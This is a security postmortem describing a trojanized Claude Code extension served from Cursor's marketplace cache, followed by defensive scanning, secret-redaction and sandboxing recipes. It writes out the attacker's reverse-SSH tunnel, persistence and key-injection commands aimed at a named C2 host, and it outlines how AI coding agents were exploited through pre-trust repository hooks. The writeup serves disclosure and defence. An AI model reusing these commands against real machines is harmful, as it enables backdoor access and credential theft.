# Cursor & Claude Code Extension Supply-Chain Attack: Vendor Traces, Marketplace Caches, and the Unsandboxed IDE Problem

Daily learning · November 26, 2026 · Multi-vendor postmortem & architectural review  
*By Srinivasan Ragothaman ([@rsrini7](https://github.com/rsrini7))*

> **Core idea:** On October 29, 2026, trojanized builds (`2.1.312` and `2.1.313`) of Anthropic's `Anthropic.claude-code` extension were served from the Cursor VS Code Extension Marketplace cache for roughly 11 hours, executing a synchronous Node.js payload in `extension.js` to exfiltrate host telemetry, inject an unauthorized `svc-telemetry` SSH key, and attempt persistent reverse SSH tunneling (`134.209.82.225`). Cursor's November 13 postmortem traced the compromise upstream to an exposed access key at inference vendor Fireworks AI, which leaked historical non-Privacy-Mode coding agent traces containing unredacted secrets. Together with earlier agentic pre-trust exploits (`CVE-2025-59536` and `CVE-2026-21852`), the incident exposes a deeper systemic flaw: AI code editors automatically pull third-party extensions into an unsandboxed Node.js Extension Host that shares full OS privileges with every developer credential on disk.

---

## 1. Foundations: Parties, Ecosystem Boundaries, and Terminology

Modern AI-assisted software development stitches together three distinct trust zones: the **local IDE runtime** (typically a Visual Studio Code fork running a Node.js Extension Host), **remote extension registries and caches** (Microsoft Visual Studio Marketplace, Open VSX, and vendor-operated mirrors), and **external LLM inference/evaluation providers** that process coding-agent prompts and traces.

### Who Was Involved—and Who Was Not

A critical first step in analyzing this incident is separating the **brand impersonated** (`Anthropic.claude-code`) from the **infrastructure compromised** (Fireworks AI's key storage and Cursor's marketplace cache):

* **Cursor (Anysphere):** Operates the Cursor AI code editor, a VS Code fork that serves extensions through its own Cursor VS Code Extension Marketplace cache backed upstream by Open VSX. Cursor's marketplace cache served the tampered `2.1.312` and `2.1.313` VSIX packages on October 29, 2026, after an attacker pivoted from leaked vendor-bucket traces into Cursor's internal SaaS tools.
* **Fireworks AI:** An inference and model-training platform used by Cursor. Fireworks disclosed two separate security incidents spanning August–October 2026; during those events, an access key Cursor had issued to Fireworks for a read-only data-sharing bucket was exposed.
* **Anthropic:** Publishes the official `Claude Code` CLI (`@anthropic-ai/claude-code` on npm) and the `Anthropic.claude-code` IDE extension. **Anthropic's internal infrastructure was not breached**, and neither Anthropic nor the official Microsoft Visual Studio Marketplace or npm distributed the tampered builds.
* **Open VSX Registry:** The open-source extension registry upstream of Cursor's marketplace. Cursor confirmed on November 13, 2026, that **Open VSX never hosted the malware**; the attacker injected the trojanized builds directly into Cursor's marketplace cache layer.

| Party | Role in the Ecosystem | Verified Impact & Action in This Incident |
|---|---|---|
| **Cursor** | AI IDE vendor and operator of the Cursor VS Code Extension Marketplace cache | Compromised cache served tampered `Anthropic.claude-code` `2.1.312` / `2.1.313` for ~11 hours (at most ~5,000 installations); pulled builds, took marketplace & C2 offline, rotated all internal keys, moved inference off Fireworks, and published IoCs and remediation scripts. |
| **Fireworks AI** | Third-party LLM inference and fine-tuning supplier | Suffered two security incidents (Aug 3–Oct 7 and Oct 23–30, 2026); exposed a Cursor-issued access key to a read-only sharing bucket; engaged Palo Alto Networks Unit 42 and AprosSyber for forensics. |
| **Anthropic** | Original publisher of `Claude Code` (`Anthropic.claude-code`) | Not compromised; official releases on Microsoft Visual Studio Marketplace and npm (`@anthropic-ai/claude-code`) remained clean throughout. |
| **Open VSX** | Upstream open-source VS Code extension registry | Confirmed unaffected; malicious artifacts were placed directly on Cursor's downstream cache rather than published upstream. |
| **Developer Endpoints** | macOS, Windows, and Linux workstations running Cursor | Workstations that fetched or auto-updated `2.1.312` / `2.1.313` executed host reconnaissance, received the `svc-telemetry` SSH key, and dropped OS persistence scripts (though non-admin privilege barriers blocked SSH daemon activation on most hosts). |

### Essential Terminology

| Term | Meaning in This Context |
|---|---|
| **VSIX Package** | Zip-based installation archive (`*.vsix`) containing a VS Code / Cursor extension's manifest (`package.json`), bundled JavaScript (`extension.js`), and assets. |
| **Extension Host** | The separate Node.js process spawned by VS Code and Cursor to execute extensions; it has full user-level OS access (`fs`, `child_process`, `os`, `net`) without a capability sandbox. |
| **IIFE Loader** | Immediately-Invoked Function Expression (`(() => { ... })()`); JavaScript executed synchronously the instant Node.js `require()`s `extension.js`, prior to the extension's normal `activate()` lifecycle hook. |
| **Non-Privacy-Mode Trace** | Historical coding-agent interaction logs collected from sessions where Privacy Mode was disabled, permitted for offline model evaluation and training. |
| **Reverse SSH Tunnel** | An outbound SSH connection (`ssh -N -R '*:0:localhost:22'`) initiated by a victim host to an attacker server, allowing the attacker to reach the victim's local port 22 despite NAT or inbound firewalls. |
| **Pre-Trust Execution** | Vulnerabilities (such as `CVE-2025-59536` and `CVE-2026-21852`) where an AI agent evaluates project files, hooks, or environment overrides *before* the user confirms the workspace trust prompt. |

---

## 2. Deep Technical Mechanism: Multi-Hop Upstream Intrusion & Payload Anatomy

The October 29, 2026 compromise did not begin with a zero-day in Cursor's editor binary or Anthropic's extension source code. It was a **four-stage cross-boundary supply-chain pivot** connecting AI training telemetry at an inference supplier to an un-sandboxed IDE extension runtime on developer laptops.

### Stage 1: From Inference Vendor Breach to Historical Agent Traces

According to Cursor's November 13, 2026 postmortem and Fireworks AI's October–November security bulletins:

1. **Vendor Key Exposure:** Fireworks AI experienced two separate security incidents in late 2026—an August 3–October 7 intrusion involving stolen internal credentials and evaluation job secrets (investigated with Unit 42), and an October 23–30 compromise originating from a third-party cloud provider hosting Fireworks R&D machines (investigated with AprosSyber). During this activity, an access key that Cursor had issued to Fireworks for a **read-only storage bucket** was exposed.
2. **Trace Harvesting:** Using that read-only bucket key, the attacker copied historical coding-agent traces dating mostly from 2025, generated from sessions where **Privacy Mode was not enabled** (affecting fewer than 0.05% of non-Privacy-Mode users). Live inference traffic and Privacy Mode sessions were not stored in this bucket.
3. **Unredacted Secret Leakage:** Although traces were meant for offline training/evaluation, a small subset contained unredacted API credentials—exposing API keys for **fewer than 0.01% of Cursor customers**.
4. **SaaS Pivot & Cache Poisoning:** Starting from credentials embedded in those historical traces, the attacker accessed select internal SaaS tools used by Cursor, archived non-production repositories, and limited support logs. From that internal foothold, the attacker obtained a credential capable of writing directly to the **cache serving the Cursor VS Code Extension Marketplace**, bypassing Open VSX and Cursor's separate production client release signing infrastructure (no Cursor app release signing keys were exposed).

### Stage 2: Trojanized VSIX Delivery & Synchronous `extension.js` IIFE

Between approximately **02:27 AM PT and 01:35 PM PT on October 29, 2026** (~11 hours), the poisoned Cursor marketplace cache served modified builds of `Anthropic.claude-code` labeled **`2.1.312`** and **`2.1.313`** (`darwin-arm64` and `win32-x64` VSIX packages). Cursor estimated that at most **5,000 users** who requested or auto-updated those specific cached versions during the 11-hour window potentially received the malicious build before it was purged and replaced with clean `2.1.314+` releases.

Forensic analyses by Cursor, Microsoft Threat Intelligence, Noma Security, and DoublePulsar established how the malware operated inside the VSIX:

* **No-Prompt Module-Load Trigger:** Rather than hooking into a UI command or waiting for a Claude Code chat prompt, the attacker prepended a **66-line obfuscated IIFE** directly to the top of the minified `extension.js` entry point (`SHA-256: ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15`).
* **Unsandboxed Node.js Capabilities:** Because the VS Code / Cursor Extension Host loads `extension.js` in a standard Node.js runtime under the developer's OS user account, the IIFE immediately imported built-in modules (`os`, `fs`, `child_process`, `path`, `http`, `crypto`) with zero permission prompts.

### Stage 3: Reconnaissance, SSH Key Injection, and Cross-Platform Persistence

Once executed, the 66-line loader carried out three concurrent operations:

1. **Host & Environment Profiling:**
   * Collected `os.hostname()`, `os.userInfo().username`, OS platform, CPU architecture, `$HOME` directory path, current working directories, global Git email, **environment variable names** (revealing what cloud/API tokens existed on the machine), and the host's public IP (via `ifconfig.me` or `api.ipify.org`).
   * Exfiltrated this JSON payload via plaintext HTTP `POST` to `http://134.209.82.225:8099/beacon` (with a fallback/local attempt to `127.0.0.1:8099/beacon`).
2. **Unauthorized SSH Key Injection (With an Appending Quirk):**
   * Appended the attacker's Ed25519 public key labeled `svc-telemetry` (`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry`) to `~/.ssh/authorized_keys` (and `%USERPROFILE%\.ssh\authorized_keys` on Windows).
   * Notably, as documented in Cursor's official remediation scripts, the malware appended the key **without a leading newline**—meaning if a developer's existing `authorized_keys` file did not end in `\n`, the attacker's key was concatenated onto the same line as the last legitimate key.
3. **OS Persistence & Reverse SSH Tunnel Loop:**
   * Dropped helper scripts and private tunnel keys (`~/.config/.smt`, `~/.config/.smtk`, `$TMPDIR/.stk_<10 hex>` on POSIX; `%USERPROFILE%\.config\smt.cmd`, `smtk`, `%TEMP%\.stk_<10 hex>` on Windows).
   * Installed platform-specific persistence to restart every ~60 seconds:
     * **macOS:** `~/Library/LaunchAgents/com.apple.sysmond.plist` (label `com.apple.sysmond`).
     * **Linux:** Crontab entry `@reboot /bin/sh "<HOME>/.config/.smt"`.
     * **Windows:** Scheduled Task `\SysMon` (attempting `SYSTEM` execution) with a fallback batch file at `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd`.
   * Attempted to enable the local SSH daemon (`systemsetup -setremotelogin on` on macOS; `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0` on Windows) and establish a reverse tunnel via `ssh -N -R '*:0:localhost:22'` or `autossh -M 0` to `tunnel@134.209.82.225` (TCP port 22) using `StrictHostKeyChecking=no` and `UserKnownHostsFile=/dev/null`.

#### Why Full Shell Exploitation Largely Failed—and When Risk Remained

Cursor and Microsoft Threat Intelligence both emphasized two technical friction points that blunted the backdoor on most laptops:
* **Privilege Boundaries & Code Defects:** Enabling macOS Remote Login (`systemsetup -setremotelogin on`) or installing Windows OpenSSH Server requires `root` / local Administrator rights, which standard non-elevated Cursor processes lack. Cursor also noted errors in the attacker's SSH activation routine on standard workstations.
* **The `localhost:22` Caveat:** As Cursor's own remediation scripts explicitly warn (`note: something listens on localhost:22; the tunnel exposed it`), if a developer *already* had `sshd` / Remote Login enabled locally and `authorized_keys` parsed cleanly, the outbound reverse tunnel could still expose local port 22 to the C2 until the cloud provider took `134.209.82.225` offline. Moreover, uninstalling the extension inside the IDE **does not remove** `~/.ssh/authorized_keys`, LaunchAgents, scheduled tasks, or `.config/.smt*` scripts.

### Stage 4: The "Much Bigger Problem" — Convergence of Extension Trust and Agentic Pre-Trust Flaws

Isolating the October 29 event as a one-off cache bug misses the structural lesson. Across 2026, two independent classes of attacks against AI coding workflows converged on the **exact same unprotected developer trust boundary**:

1. **The Unsandboxed IDE Extension Host + Auto-Update Model:**
   Unlike web browsers (which enforce Origin isolation, CSP, and permission prompts) or mobile OSes (which isolate app containers), VS Code and its AI forks execute every installed extension in a shared, unsandboxed Node.js process with silent background updates. Compromising a single CDN cache, publisher PAT, or vendor credential grants attackers immediate access to `~/.ssh`, `~/.aws`, `~/.kube`, `.env` files, and browser tokens across thousands of engineering workstations simultaneously.
2. **Pre-Trust Agentic Configuration Exploits (`CVE-2025-59536` & `CVE-2026-21852`):**
   Even when an AI tool's binary and extension provenance are 100% authentic, Check Point Research demonstrated in early 2026 that agentic harnesses themselves expanded the local attack surface. Before Anthropic patched `CVE-2025-59536` and `CVE-2026-21852`, merely cloning and opening an untrusted repository in Claude Code allowed malicious `.mcp.json` / `.claude/settings.json` hooks or an overridden `ANTHROPIC_BASE_URL` variable to execute shell commands or exfiltrate plaintext Anthropic API keys **prior to the user accepting the startup workspace trust dialog**.
3. **AI Trace Buckets as Shadow Credential Stores:**
   Developer agents routinely inspect `.env` files, terminal stack traces, and curl headers while debugging. When non-Privacy-Mode traces are persisted to third-party training/eval pipelines without deterministic secret redaction, those trace buckets effectively become unrotated plaintext secret vaults outside enterprise IAM and KMS controls.

---

## 3. Architectural Visuals

The diagram below synthesizes the end-to-end upstream pivot from Fireworks AI to the Cursor marketplace cache, the synchronous `extension.js` payload execution on developer hosts, and the four-pillar defense-in-depth blueprint:

![Cursor Claude Code Extension Supply-Chain Attack Architecture](assets/Cursor-Claude-Code-Extension-Supply-Chain-Attack-Nov-2026.svg)

*Figure 1: End-to-end attack progression from Fireworks AI vendor key exposure and 2025 trace leakage to Cursor marketplace cache poisoning (`v2.1.312` / `v2.1.313`), synchronous `extension.js` IIFE execution, and the four-pillar defense-in-depth controls for AI coding workstations.*

### End-to-End Attack & Containment Sequence

```mermaid
sequenceDiagram
    autonumber
    participant Attacker as Threat Actor
    participant Fireworks as Fireworks AI / Shared Bucket
    participant CursorInternal as Cursor SaaS & Cache
    participant DevIDE as Developer IDE (Extension Host)
    participant C2 as Attacker C2 (134.209.82.225)

    Attacker->>Fireworks: Accesses exposed Cursor bucket key
    Fireworks-->>Attacker: Exfiltrates 2025 non-Privacy-Mode traces (<0.01% unredacted keys)
    Attacker->>CursorInternal: Pivots via trace keys into internal SaaS & cache creds
    Attacker->>CursorInternal: Injects tampered Anthropic.claude-code 2.1.312 and 2.1.313
    DevIDE->>CursorInternal: Auto-updates or installs extension (~11h window)
    CursorInternal-->>DevIDE: Serves trojanized VSIX (Open VSX & npm unaffected)
    DevIDE->>DevIDE: Node.js require() runs 66-line IIFE before activate()
    DevIDE->>C2: HTTP POST host, env names, git email, IP to :8099/beacon
    DevIDE->>DevIDE: Appends svc-telemetry SSH key and drops LaunchAgent / SysMon
    DevIDE->>C2: Attempts ssh -N -R reverse tunnel to port 22 every 60s
    CursorInternal->>CursorInternal: Detects anomaly, purges cache, rebuilds marketplace
    CursorInternal->>C2: Coordinates with cloud host to take down C2 infrastructure
```

### Comparing the Two Systemic AI Coding Attack Vectors

```mermaid
flowchart TD
    subgraph Vector1["Vector 1: Marketplace Supply Chain"]
        A1["Compromised Vendor Key / Cache"] --> B1["Tampered VSIX (v2.1.312 / v2.1.313)"]
        B1 --> C1["IDE Auto-Update Without Client Sig Verify"]
        C1 --> D1["IIFE Runs on Node.js Extension Host Load"]
    end

    subgraph Vector2["Vector 2: Repo Pre-Trust Configs"]
        A2["Untrusted Public / PR Git Repo"] --> B2["Poisoned .mcp.json or .claude/settings.json"]
        B2 --> C2["Developer Opens Project Folder"]
        C2 --> D2["Pre-Trust Hook / ANTHROPIC_BASE_URL Exploit"]
    end

    D1 --> E["Same Unsandboxed Developer User Context"]
    D2 --> E
    E --> F["Exposure: ~/.ssh, ~/.aws, .env, SaaS Tokens, Source Code"]
```

---

## 4. Production Implementations & Defensive Code Recipes

Defending engineering workstations against both compromised IDE marketplace caches and credential-leaking agent traces requires automated endpoint verification, deterministic trace scrubbing, and container/proxy isolation.

### Recipe 1: Cross-Platform Forensic Artifact & Extension Hash Hunter (Python)

Because simply uninstalling an extension leaves dropped persistence scripts and SSH keys intact—and because tampered bundles retain valid-looking version numbers (`2.1.312` / `2.1.313`)—this read-only forensic scanner inspects extension directories by **content and SHA-256**, checks `~/.ssh/authorized_keys` (including the missing-leading-newline concatenation case), and audits OS persistence paths.

```python
#!/usr/bin/env python3
"""
hunt_claude_ext_ioc.py - Read-only forensic scanner for the Oct 29, 2026
Cursor marketplace trojanized Anthropic.claude-code (2.1.312 / 2.1.313) artifacts.
"""

from __future__ import annotations

import hashlib
import os
import platform
import socket
from pathlib import Path
from typing import List, Dict, Any

TARGET_EXTENSION_JS_SHA256 = (
    "ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15"
)
IOC_MARKERS = (
    "134.209.82.225",
    "svc-telemetry",
    "AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P",
)


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def scan_extensions(home: Path) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    # Covers ~/.cursor/extensions, ~/.vscode/extensions, ~/.vscode-insiders/extensions, etc.
    for ext_dir in home.glob(".*/extensions/anthropic.claude-code-*"):
        js_path = ext_dir / "extension.js"
        if not js_path.is_file():
            # Some VSIX layouts nest bundled output under dist/ or out/
            candidates = list(ext_dir.rglob("extension.js"))
        else:
            candidates = [js_path]

        for candidate in candidates:
            try:
                digest = sha256_file(candidate)
                raw_text = candidate.read_text(encoding="utf-8", errors="ignore")
            except OSError as exc:
                findings.append({"path": str(candidate), "error": str(exc)})
                continue

            matched_markers = [m for m in IOC_MARKERS if m in raw_text]
            if digest == TARGET_EXTENSION_JS_SHA256 or matched_markers:
                findings.append(
                    {
                        "type": "INFECTED_EXTENSION_JS",
                        "path": str(candidate),
                        "sha256": digest,
                        "hash_match": digest == TARGET_EXTENSION_JS_SHA256,
                        "markers": matched_markers,
                    }
                )
    return findings


def scan_authorized_keys(home: Path) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    candidate_files = [home / ".ssh" / "authorized_keys"]
    if platform.system() == "Windows":
        candidate_files.append(Path(r"C:\ProgramData\ssh\administrators_authorized_keys"))

    for ak in candidate_files:
        if not ak.is_file():
            continue
        content = ak.read_text(encoding="utf-8", errors="ignore")
        for idx, line in enumerate(content.splitlines(), start=1):
            if "svc-telemetry" in line or "IDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P" in line:
                # Detect missing-newline concatenation onto a legitimate key
                concatenated = not line.lstrip().startswith("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ")
                findings.append(
                    {
                        "type": "UNAUTHORIZED_SSH_KEY",
                        "file": str(ak),
                        "line": idx,
                        "concatenated_with_existing_key": concatenated,
                    }
                )
    return findings


def scan_persistence_paths(home: Path) -> List[str]:
    system = platform.system()
    suspicious_paths: List[Path] = [
        home / ".config" / ".smt",
        home / ".config" / ".smtk",
        home / ".config" / "smt.cmd",
        home / ".config" / "smtk",
    ]
    if system == "Darwin":
        suspicious_paths.append(home / "Library" / "LaunchAgents" / "com.apple.sysmond.plist")
    elif system == "Windows":
        appdata = Path(os.environ.get("APPDATA", ""))
        if appdata:
            suspicious_paths.append(
                appdata / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "sysmon.cmd"
            )

    found = [str(p) for p in suspicious_paths if p.exists()]
    tmp_dir = Path(os.environ.get("TMPDIR", "/tmp"))
    for stk in tmp_dir.glob(".stk_*"):
        found.append(str(stk))
    return found


def check_local_ssh_listener() -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.5)
        return sock.connect_ex(("127.0.0.1", 22)) == 0


def main() -> int:
    home = Path.home()
    ext_hits = scan_extensions(home)
    ssh_hits = scan_authorized_keys(home)
    persist_hits = scan_persistence_paths(home)
    sshd_listening = check_local_ssh_listener()

    print(f"Host: {socket.gethostname()} | OS: {platform.system()} | Home: {home}")
    print(f"Local port 22 listening (127.0.0.1:22): {sshd_listening}")

    if not ext_hits and not ssh_hits and not persist_hits:
        print("[OK] No known Oct 29 Claude Code extension IoCs detected on disk.")
        return 0

    print("[ALERT] Indicators detected:")
    for item in ext_hits + ssh_hits:
        print(f"  - {item}")
    for path in persist_hits:
        print(f"  - Persistence/dropper artifact: {path}")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
```

### Recipe 2: Pre-Storage Secret Redaction Pipeline for Agent Traces (Python)

Because Cursor's postmortem confirmed that unredacted API tokens in historical 2025 coding-agent traces served as the initial pivot key, any telemetry or training pipeline that retains non-ZDR traces must scrub both **known secret prefixes** and **high-entropy unassigned strings** *before* object storage ingestion.

```python
#!/usr/bin/env python3
"""
trace_scrubber.py - Deterministic secret redaction for coding-agent traces
prior to persisting logs or sharing evaluation buckets with inference vendors.
"""

from __future__ import annotations

import math
import re
from collections import Counter
from typing import Dict, List, Tuple

KNOWN_SECRET_PATTERNS: List[Tuple[str, re.Pattern[str]]] = [
    ("ANTHROPIC_KEY", re.compile(r"\bsk-ant-[A-Za-z0-9\-_]{20,}\b")),
    ("OPENAI_KEY", re.compile(r"\bsk-(?:proj-|svcacct-)?[A-Za-z0-9\-_]{20,}\b")),
    ("GITHUB_TOKEN", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{20,}\b")),
    ("AWS_ACCESS_KEY", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("BEARER_OR_JWT", re.compile(r"\bBearer\s+[A-Za-z0-9\-_\.=]{20,}\b", re.IGNORECASE)),
    (
        "PRIVATE_KEY_BLOCK",
        re.compile(
            r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----[\s\S]+?-----END [A-Z0-9 ]*PRIVATE KEY-----"
        ),
    ),
    (
        "ENV_ASSIGNMENT",
        re.compile(
            r"(?im)^([A-Z0-9_]*(?:KEY|TOKEN|SECRET|PASSWORD|PASS|AUTH|CREDENTIAL)[A-Z0-9_]*)\s*=\s*(['\"]?)([^\s'\"]{8,})\2"
        ),
    ),
]

HIGH_ENTROPY_CANDIDATE = re.compile(r"\b[A-Za-z0-9+/=_\-]{32,}\b")


def shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


def redact_trace_text(text: str, entropy_threshold: float = 4.3) -> Tuple[str, Dict[str, int]]:
    stats: Dict[str, int] = {}
    redacted = text

    for label, pattern in KNOWN_SECRET_PATTERNS:
        if label == "ENV_ASSIGNMENT":
            def _env_repl(m: re.Match[str]) -> str:
                stats[label] = stats.get(label, 0) + 1
                return f"{m.group(1)}=[REDACTED:{label}]"
            redacted = pattern.sub(_env_repl, redacted)
        else:
            redacted, count = pattern.subn(f"[REDACTED:{label}]", redacted)
            if count:
                stats[label] = stats.get(label, 0) + count

    # Catch unprefixed high-entropy secrets (e.g., custom SaaS API keys) while skipping git SHAs
    def _entropy_repl(m: re.Match[str]) -> str:
        token = m.group(0)
        if re.fullmatch(r"[0-9a-f]{40}|[0-9a-f]{64}", token):
            return token  # Preserve standard Git SHA-1 / SHA-256 digests
        if shannon_entropy(token) >= entropy_threshold:
            stats["HIGH_ENTROPY_TOKEN"] = stats.get("HIGH_ENTROPY_TOKEN", 0) + 1
            return "[REDACTED:HIGH_ENTROPY_TOKEN]"
        return token

    redacted = HIGH_ENTROPY_CANDIDATE.sub(_entropy_repl, redacted)
    return redacted, stats


if __name__ == "__main__":
    sample_trace = (
        "Debug log: ANTHROPIC_API_KEY=sk-ant-api03-exampleSecretValue1234567890abcd\n"
        "Commit: ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15\n"
        "Custom token: xK9mP2vQ8rT4wZ7yB1nC6fH3jL5sD0gA9qW2eR5tY8uI\n"
    )
    cleaned, counts = redact_trace_text(sample_trace)
    print(cleaned)
    print("Redaction summary:", counts)
```

### Recipe 3: Hardened IDE Extension Policy & Rootless Devcontainer Isolation

To neutralize both silent marketplace cache updates and unsandboxed Extension Host access to host credentials (`~/.ssh`, `~/.aws`), teams should disable background auto-updates on workstations and isolate agentic coding workspaces inside rootless Devcontainers without host credential mounts:

```json
// .devcontainer/devcontainer.json — Isolated AI Coding Agent Workspace
{
  "name": "hardened-agent-sandbox",
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu-24.04",
  "remoteUser": "vscode",
  "runArgs": [
    "--cap-drop=ALL",
    "--security-opt=no-new-privileges:true",
    "--read-only",
    "--tmpfs=/tmp:rw,noexec,nosuid,size=512m",
    "--network=agent-egress-net"
  ],
  "customizations": {
    "vscode": {
      "settings": {
        "extensions.autoUpdate": false,
        "extensions.autoCheckUpdates": false,
        "security.workspace.trust.enabled": true,
        "security.workspace.trust.startupPrompt": "always",
        "security.workspace.trust.untrustedFiles": "prompt"
      }
    }
  },
  // Never bind-mount host ~/.ssh, ~/.aws, or ~/.kube into agent containers.
  // Route LLM & Git traffic through an external HTTP egress credential proxy instead.
  "remoteEnv": {
    "HTTPS_PROXY": "http://egress-proxy.internal:3128",
    "NO_PROXY": "localhost,127.0.0.1"
  }
}
```

---

## 5. Impact, Real-World Edge Cases & Gotchas

### Common Claims vs. Technical Realities

| Claim or Misconception | Technical Reality (Verified Against Primary Advisories) |
|---|---|
| **"Anthropic's Claude Code servers or official packages were hacked."** | **False.** Both Cursor and Microsoft Threat Intelligence confirmed Anthropic's systems, npm (`@anthropic-ai/claude-code`), and Microsoft's Visual Studio Marketplace were **never compromised**. The malicious builds were impersonated copies injected into Cursor's marketplace cache. |
| **"Open VSX hosted the trojanized extension."** | **False.** While early secondary summaries assumed Open VSX was the source, Cursor's November 13 postmortem explicitly confirmed: *"The marketplace source, Open VSX, never had the malware."* |
| **"Uninstalling the extension from Cursor cleans the machine."** | **False.** The 66-line IIFE drops standalone persistence (`com.apple.sysmond.plist`, Windows Scheduled Task `\SysMon`, `~/.config/.smt*`) and appends the `svc-telemetry` key to `authorized_keys`. Uninstalling the extension leaves every out-of-band artifact active. |
| **"Non-admin users suffered zero impact because `sshd` failed to start."** | **Partially false.** While `systemsetup -setremotelogin on` and `Add-WindowsCapability` fail without `root`/Admin rights, the extension still exfiltrated host metadata and environment variable names to `134.209.82.225:8099`, planted `svc-telemetry` in `authorized_keys`, installed persistence, and could expose `localhost:22` if SSH was already running. |
| **"All Cursor users' live code and prompts were exposed via Fireworks."** | **False.** Cursor stated that Privacy Mode sessions and live inference traffic were unaffected; the exposed read-only bucket held historical 2025 non-Privacy-Mode traces affecting `<0.05%` of non-Privacy-Mode users and unredacted API keys for `<0.01%` of customers. |

### Real-World Edge Cases & Forensic Gotchas

1. **The Missing-Newline `authorized_keys` Bug:**
   Because the malware appended `ssh-ed25519 ... svc-telemetry` without a leading `\n`, endpoints whose `~/.ssh/authorized_keys` lacked a trailing newline ended up with two keys merged onto a single line. Naive cleanup commands like `grep -v svc-telemetry ~/.ssh/authorized_keys` would **delete the developer's own legitimate SSH key** on that same line! Cursor's `remediate-macos.sh` specifically solved this using `perl -0pe` to strip only the exact key substring while preserving adjacent key bytes, symlinks, and file permissions (`0600`).
2. **Pre-Existing Local SSH Daemons (`localhost:22`):**
   Developers who routinely enable macOS *Remote Login* or run local OpenSSH servers for port forwarding or Ansible testing already have a daemon listening on `127.0.0.1:22`. On those hosts, even though the malware's `systemsetup` command failed without `sudo`, the unprivileged user-mode `ssh -N -R '*:0:localhost:22'` reverse tunnel could still bridge the attacker directly to `sshd` until the C2 server (`134.209.82.225`) was taken down.
3. **Version-Number Spoofing Defeats Naive Inventory Audits:**
   Both tampered packages reused plausible sequential version strings (`2.1.312` and `2.1.313`) under the authentic publisher namespace `Anthropic.claude-code`. Asset management queries checking only extension ID and version ranges can miss cached or sideloaded variants; verification must inspect `extension.js` hashes and content markers (`svc-telemetry`, `134.209.82.225`).
4. **Telemetry Names as Target Maps:**
   Even though the loader exfiltrated environment variable *names* rather than raw values in its HTTP beacon, knowing whether a laptop carries `PROD_AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, or `STRIPE_SECRET_KEY` lets threat actors prioritize which developer machines to target over the reverse tunnel or follow-on phishing.

---

## 6. Practical Adoption Blueprint & Verification Checklist

### Developer & Enterprise Hardening Checklist

- [ ] **Audit Endpoints by Artifact, Not Just Extension Version:** Run the forensic checks below across macOS, Windows, and Linux developer fleets; verify `~/.ssh/authorized_keys`, LaunchAgents, cron jobs, and Windows Scheduled Tasks.
- [ ] **Disable Silent Extension Auto-Updates in High-Sensitivity Environments:** Set `"extensions.autoUpdate": false` in managed enterprise IDE profiles, and restrict extension installations to an internal allowlisted VSIX mirror or pinned version digests.
- [ ] **Isolate AI Coding Agents from Host Credentials:** Run Claude Code, Cursor agents, and untrusted repositories inside rootless Devcontainers or ephemeral cloud workspaces with `--cap-drop=ALL` and **no bind-mounts** to `~/.ssh`, `~/.aws`, or `~/.kube`.
- [ ] **Enforce Privacy Mode / Zero Data Retention (ZDR) & Egress Proxies:** Verify Privacy Mode is locked on at the organization tier for all AI coding tools, and route outbound agent API calls through an HTTP egress credential proxy so plaintext secrets never enter environment variables or agent traces.
- [ ] **Rotate Exposed Credentials from a Trusted Host:** If any host shows evidence of `2.1.312` / `2.1.313` execution—or if notified by Cursor/Fireworks—rotate SSH keys, GitHub PATs, cloud IAM keys, and LLM API tokens from a clean machine.

### Exact Diagnostic Commands & Primary IoCs

Verify endpoints and telemetry logs against the indicators published in Cursor's official October 29/30 advisory:

```bash
# 1. Check macOS / Linux SSH authorized_keys for the injected svc-telemetry key
grep -qs 'svc-telemetry' ~/.ssh/authorized_keys \
  && echo "ALERT: svc-telemetry key found" \
  || echo "Clean: no svc-telemetry key in ~/.ssh/authorized_keys"

# 2. Scan installed VS Code / Cursor extension bundles by content and SHA-256
rg -l '134\.209\.82\.225|svc-telemetry' ~/.*/extensions/anthropic.claude-code-* 2>/dev/null
shasum -a 256 ~/.cursor/extensions/anthropic.claude-code-*/extension.js 2>/dev/null
# Compromised extension.js SHA-256:
# ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15

# 3. Inspect macOS LaunchAgents, dropped helper scripts, and local SSH listeners
ls -la ~/Library/LaunchAgents/com.apple.sysmond.plist ~/.config/.smt* 2>/dev/null
lsof -nP -iTCP:22 -sTCP:LISTEN
```

| Artifact / Platform | Version | SHA-256 Digest | MD5 Digest |
|---|---|---|---|
| **Trojanized `extension.js` (macOS & Win)** | `2.1.312` / `2.1.313` | `ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15` | `f49bcd657ef1e626e85ce858958c1769` |
